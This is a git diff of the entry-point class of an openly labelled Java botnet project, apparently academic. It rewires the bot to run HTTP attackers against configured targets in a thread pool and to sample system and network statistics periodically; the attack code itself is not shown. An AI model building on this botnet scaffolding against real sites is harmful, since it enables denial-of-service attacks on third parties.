@@ -26,20 +26,20 @@
 
 package com.acmutv.botnet;
 
+import com.acmutv.botnet.attacks.NetworkSampler;
+import com.acmutv.botnet.attacks.SystemSampler;
 import com.acmutv.botnet.control.BotShutdown;
 import com.acmutv.botnet.config.BotConfigurator;
 import com.acmutv.botnet.config.BotConfiguration;
-import com.acmutv.botnet.control.TargetAttacker;
+import com.acmutv.botnet.attacks.HTTPAttacker;
 import com.acmutv.botnet.model.Target;
 
 import java.util.List;
-import java.util.concurrent.ExecutorService;
-import java.util.concurrent.Executors;
-import java.util.concurrent.TimeUnit;
+import java.util.concurrent.*;
 
 /**
  * This class realizes the bot entry-point.
- * @author Giacomo Marciani {@literal <gmarciani@ieee.org>}
+ * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
  * @author Michele Porretta {@literal <mporretta@acm.org>}
  * @since 1.0
  */
@@ -51,34 +51,19 @@ public class BotMain {
    */
   public static void main(String[] args) {
 
-    final BotConfiguration config = BotConfigurator.loadConfiguration(args);
+    BotConfiguration config = BotConfigurator.loadConfiguration(args);
 
     registerShutdownHooks(new BotShutdown());
 
-    attackTargets(config.getTargets());
-
-  }
-
-  /**
-   * Schedules the attacks
-   * @param targets The list of targets to attack.
-   * @see Target
-   */
-  private static void attackTargets(List<Target> targets) {
-    ExecutorService executor = Executors.newFixedThreadPool(10);
-
-    for (Target tgt : targets) {
-      Runnable attacker = new TargetAttacker(tgt, true);
-      executor.execute(attacker);
+    if (config.isSysStat()) {
+      registerPeriodic(new SystemSampler(), 0, config.getSysStatFreq());
     }
 
-    executor.shutdown();
-
-    try {
-      executor.awaitTermination(60, TimeUnit.SECONDS);
-    } catch (InterruptedException e) {
-      e.printStackTrace();
+    if (config.isNetStat()) {
+      registerPeriodic(new NetworkSampler(), 0, config.getSysStatFreq());
     }
+
+    registerHTTPAttackers(config.getTargets());
   }
 
   /**
@@ -93,5 +78,38 @@ public class BotMain {
     for (Runnable hook : hooks) {
       runtime.addShutdownHook(new Thread(hook));
     }
+  }
+
+  private static void registerHTTPAttackers(List<Target> targets) {
+    ExecutorService executor = Executors.newFixedThreadPool(10);
+
+    for (Target tgt : targets) {
+      Runnable attacker = new HTTPAttacker(tgt, true);
+      executor.execute(attacker);
+    }
+
+    executor.shutdown();
+
+    try {
+      executor.awaitTermination(60, TimeUnit.SECONDS);
+    } catch (InterruptedException e) {
+      e.printStackTrace();
+    }
+  }
+
+  /**
+   * Registers a periodic task.
+   * @param task the task to execute.
+   * @param delay the delay (in seconds) to first execution.
+   * @param period the period (in seconds) between executions.
+   */
+  private static void registerPeriodic(Runnable task, long delay, long period) {
+    final ScheduledExecutorService scheduler =
+        Executors.newScheduledThreadPool(1);
+    final ScheduledFuture<?> handler =
+        scheduler.scheduleAtFixedRate(task, delay, period, TimeUnit.SECONDS);
+    scheduler.schedule(new Runnable() {
+      public void run() { handler.cancel(true); }
+    }, 60 * 60, TimeUnit.SECONDS);
   }
 }
